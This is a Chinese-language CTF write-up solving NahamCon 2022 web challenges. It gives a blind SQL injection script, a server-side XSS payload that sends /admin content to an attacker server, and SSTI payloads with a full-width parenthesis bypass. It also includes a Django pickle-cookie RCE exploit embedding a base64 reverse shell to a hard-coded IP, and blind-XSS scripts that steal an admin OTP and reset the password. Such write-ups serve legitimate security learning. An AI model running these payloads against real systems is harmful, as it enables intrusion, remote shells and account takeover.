---
title: NahamCon CTF 2022
categories: 赛题wp
---

# Flaskmetal Alchemist

<!--more-->

看一下依赖

![image-20220430132042077](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220430132042077.png)

看一下modules.py

![image-20220430132134214](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220430132134214.png)

flag在Flag中，看下主体逻辑

![image-20220430132216613](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220430132216613.png)

使用like与两个%包裹用户输入的数据，这里无法进行注入，往下看到有个order_by这里可控，确实存在注入

https://github.com/sqlalchemy/sqlalchemy/issues/4481#issuecomment-461204518

![image-20220430132404766](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220430132404766.png)



但是题目用的是sqlite，没有if，使用 **case  when ... then .. else .. end**

exp

```python
import requests
import time

s='abcdefghijklmnopqrstuvwxyz1234567890{}_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM'
url = "http://challenge.nahamcon.com:30678/"

flag=''
for i in range(1,40):
 for a in s:
    payload="case when(substr((select flag from Flag),{},1)='{}') then randomblob(1) else 2 end limit 1,1".format(i,a)
    data = {"search":"Li","order":payload}
    r=requests.post(url,data=data)
    if "Beryllium" not in r.text:
        flag+=a
        print(flag)
        break
    else:
        pass
```

# Hacker Ts

- Server-Side-Xss

>  We all love our hacker t-shirts. Make your own custom ones.

功能点是用户输入文字，然后将文字生成图片"印"到T恤上。有"/admin"页面，但是无法访问

![image-20220502132647343](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502132647343.png)

此时的URL：http:// challenge.nahamcon.com:31762/exploit?text=test&color=#24d600，产生的效果类似于生成了一个pdf，然后与衣服的图片叠加起来了

![image-20220502132828575](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502132828575.png)

对于text字段可以尝试输入html，看其变化  **\<script>document.write(123)\</script>**，发现生成html页面，可以执行js，也就是说存在一个服务端xss

- Server Side XSS -> [Server Side XSS (Dynamic PDF) - HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

![image-20220502151135923](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502151135923.png)

通过搜索了pdf的相关利用方式，基本上就是本地文件读取和ssrf，所以可以尝试利用本地文件读取

```
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)
};
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

当执行时，爆了错误，看到使用了 wkhtmltoimage，佐证了上面的猜测，可能报错的原因查了一下，wkhtmltopdf,在0.12.6版本默认禁止读取本地文件

![image-20220502152458573](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502152458573.png)切换攻击方式，我们可以利用 **XMLHttpRequest** 去让服务器访问/admin，然后将访问的内容返回到hacker的vps上

将payload进行urlencode

```
<script>
x=new XMLHttpRequest();
x.open("GET","http://localhost:5000/admin");
x.onload=function(){var i = new Image(); i.src = "https://<vps>/?c=" + btoa(this.responseText)};
x.send();
</script>
```

关于XMLHttpRequest() [XMLHttpRequestEventTarget.onload | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/XMLHttpRequest/load_event)

![image-20220502153314095](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502153314095.png)

页面回显了?C=xxxx

FLAG：flag{461e2452088eb397b6138a5934af6231}

# Deafcon

- SSTI
- 全半角绕过括号过滤
- mailto Xss

> Deafcon 2022 is finally here! Make sure you don't miss it.

功能点：输入用户名以及邮箱会生成一个pdf，对于PDF信息为： wkhtmltopdf 0.12.5

对于用户名以及邮箱有着严格的过滤

- username：[a-zA-Z0-9_]
- email：符合RFC5322-compliant 以及 no parenthese

![image-20220502161048074](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502161048074.png)

对于username来说，绕过基本是不可能的，所以在比赛的时候我就围绕email进行了测试，一开始我找到了关于email地方的xss

https://infosecwriteups.com/intigriti-xss-challenge-0321-472ae0a48254

大概来说就是，关于a标签，插入正常的email为：

```
<a href="mailto:a@b.com">a@b.com</a>
```

这会指向a@b.com的邮箱，我们根据RFC5322的规范 `@`符号前可以加上 `"` 也就是说`"a"@b.com`，如果我们加上payload

```
"onmousemove=alert(1);"@evil.com
```

也就导致了这样的xss

```
<a href="mailto:" onmousemove="alert(1);&quot;@evil.com&quot;">"onmousemove=alert(1);"@evil.com</a>
```

 成功执行js

![image-20220502162755447](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502162755447.png)

搭配着pdf进行xss进而ssrf或者读文件岂不是轻轻松松拿下？事实就是，太年轻了，找不到利用点，准确来说找不到a标签的利用点，上面是利用鼠标移动触发的xss，现在的情况是生成pdf，无法利用，对于js缺少相关知识，没有找到利用点。

根据 [表单 - 电子邮件地址中允许使用哪些字符？- 堆栈溢出 (stackoverflow.com)](https://stackoverflow.com/questions/2049502/what-characters-are-allowed-in-an-email-address)

![image-20220502202726900](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502202726900.png)

我们可以尝试下SSTI，因为网站风格确实有点像python的风格，所以我尝试了

```
"{{7*7}}"@qq.com
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

![image-20220502202942629](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502202942629.png)

SSTI的payload打过去发现过滤了`()` 

![image-20220502204839081](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502204839081.png)

这SSTI中哪个payload不用括号？然后就G了

WP：

利用 **全角括号** 进行绕过，在这份报告中 [The return of the ＜ (hackerone.com)](https://hackerone.com/reports/639684)，研究人员输入全角字母，然后经过规范化后转为半角

[（ | 全角左括号](https://graphemica.com/（) 、[） | 全角右括号](https://graphemica.com/）)

payload

```
"{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen（'id'）.read（） }}"@qq.com
```

![image-20220502210127683](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502210127683.png)

FLAG：flag{001a305ac5ab4b4ea995e5719ab10104}



# Poller

- Django
- PickleSerializer
- pickle反序列化

> Have your say! Poller is the place where all the important infosec questions are asked.

网站框架为Django，正常注册登录后发现有三个投票

![image-20220502211534718](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502211534718.png)

在html页面发现了

```
<!-- https://github.com/congon4tor/poller -->
```

看了下github的记录，删除了默认的 key

![image-20220502212818125](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502212818125.png)

但是 .env文件又被推了上去，所以说还是得到了key

![image-20220502212855027](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502212855027.png)

搜索得到文章 django使用

> 在花了一些时间在谷歌上搜索利用密钥的方法后，我发现这个应用程序正在使用基于cookie的会话和个性化的PickleSerializer。

[一些IngeHack CTF 2021文章](https://chiko360.medium.com/some-ingehack-ctf-2021-writeups-c1c767dc6736)

exp

```python
import django.core.signing
from pyspark.serializers import PickleSerializer
import builtins

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "config.settings.production")
SECRET_KEY = "77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!" # from .env
payload = 'getattr(__import__("os"), "system")("echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMS4xMTYuMTEwLjYxIiwzMDAwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9zaCIpJwo= | base64 -d | sh")' # change this


class PickleRce(object):
    def __reduce__(self):
        return (builtins.eval, (payload,))


cookie = PickleRce()
signed_cookie = django.core.signing.dumps(cookie, key=SECRET_KEY, serializer=PickleSerializer,
                                          salt='django.contrib.sessions.backends.signed_cookies', compress=True)
print(signed_cookie)
```

环境问题没能成功

# Two For One

- Blind Xss
- Xss盲打

虚空复现一下，注册用户后需要Google Authenticator来扫一下QR，好吧，还得费劲下载，摆了

![image-20220502220439862](https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nahamconCTF%2Fimage-20220502220439862.png)

题目要求是以管理员用户登录，在 "Feedback" 页面直接插入xss

```
<img src="https://<myserver>/?hello-from-img-tag">
```

收到请求

```
"GET /?hello-from-img-tag HTTP/1.1" 200 0 "http://localhost:5000/feedback/1" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.113 Safari/537.36"
```

然后去获取了管理员的OTP

```
<script>
setTimeout(reset2fa, 5000);

function reset2fa() {
    fetch("/reset2fa", {
        method: "POST",
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
    }).then(res => {
        res.json().then((json) => {
            var i = new Image(1, 1);
            i.src = "https://<myserver>/?otp=" + btoa(json.url);
        });
    })
};
</script>
```

获得管理员的OTP

```
otpauth://totp/Fort%20Knox:admin?secret=4LD5HQA4HVJGQPDV&issuer=Fort%20Knox
```

然后重置管理员密码

```
<script>
setTimeout(reset_password, 5000);

function reset_password() {
    data = {
      "otp": "<admin OTP>",  // change this
      "password": "hoge",
      "password2": "hoge"
    }

    fetch("/reset_password", {
      method: "POST",
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(res => {
        var i = new Image(1, 1);
        i.src = "https://<myserver>/?message=password_change_done";
    });
  };
</script>
```

